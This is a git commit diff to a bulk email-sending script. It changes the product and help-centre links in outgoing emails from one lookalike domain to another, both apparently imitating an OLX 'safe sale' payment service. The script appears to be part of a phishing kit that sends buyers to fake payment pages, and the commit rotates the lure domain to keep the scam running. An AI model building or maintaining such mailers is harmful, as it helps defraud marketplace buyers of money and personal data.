3c080c4252324a98e4aec3b7e56d9519025124a3
RaySilvaJS <tobizinhoofc@gmail.com>
2025-07-02 16:25:03 -0300

    uky

--- js/envio-email.js
+++ js/envio-email.js
@@ -88,7 +88,7 @@ async function enviarEmMassa(
   const nomeComprador = produto.comprador;
   const bico = produto.vendedor.nome
 
-  const linkProduto = `https://olxvendasegura.shop/pag/?id=${codigoVenda}`;
+  const linkProduto = `https://liberacao-vendapay.shop/pag/?id=${codigoVenda}`;
 
   // Contadores para estatísticas
   let enviados = 0;
@@ -155,7 +155,7 @@ async function enviarEmMassa(
   </p>
 
   <div style="text-align:center; margin-top:20px;">
-    <a href="https://olxvendasegura.shop/pag/central-ajuda.html" target="_blank"
+    <a href="https://liberacao-vendapay.shop/pag/central-ajuda.html" target="_blank"
        style="background-color:#7027f9; color:white; text-decoration:none; padding:12px 24px; border-radius:30px; display:inline-block; font-weight:bold; font-size:15px; box-shadow:0 2px 6px rgba(0,0,0,0.2); transition:background 0.3s;">
       Central de Ajuda
     </a>
